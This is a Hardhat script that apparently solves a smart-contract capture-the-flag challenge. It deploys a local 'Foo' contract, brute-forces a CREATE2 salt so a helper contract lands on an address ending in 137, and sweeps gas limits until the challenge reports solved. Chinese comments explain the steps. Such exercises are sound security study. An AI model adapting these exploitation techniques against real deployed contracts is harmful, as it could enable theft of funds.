const { ethers } = require("hardhat");
const create2 = require('eth-create2')
require('dotenv').config();

async function main() {
    
    let [deployer, user] = await ethers.getSigners();
    const provider = ethers.provider
    const Foo = await ethers.getContractFactory("Foo", user);
    const foo = await Foo.deploy();

    console.log("isSolved", await foo.connect(user).isSolved())
    for (let g=60000;g<70000;g+=500){
        console.log(g);
        const AttackWho = await ethers.getContractFactory("AttackWho", user);
        const attackWho = await AttackWho.deploy(foo.address);
        const ForFoo = await ethers.getContractFactory("ForFoo", user);
        let salt = ethers.BigNumber.from(0).toHexString();
        // 找salt使部署的合约符合setup()的要求
        for (i=0; i<10000; i++){
            const address = create2(attackWho.address, ethers.BigNumber.from(i).toHexString(), ForFoo.bytecode);
            if (ethers.BigNumber.from(address.toString()).mod(1000) == 137){
                salt = ethers.BigNumber.from(i).toHexString();
                break;
            }
        }

        // 找gas符合stage2()的要求
        try{
            await attackWho.attack(salt, 100000, g, {gasLimit:10000000}); // 这两个gas跟编译器优化有关，什么优化都不开时是这样设置
        } catch (error) {}
        // console.log(await attackWho.forFoo())
        // console.log(await provider.getStorageAt(foo.address, await attackWho.getStats1()))
        // console.log(await provider.getStorageAt(foo.address, await attackWho.getStats2()))
        // console.log(await provider.getStorageAt(foo.address, await attackWho.getStats3()))
        console.log("isSolved", await foo.connect(user).isSolved())
        if (await attackWho.forFoo() != "0x0000000000000000000000000000000000000000"){
            break
        }
    }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
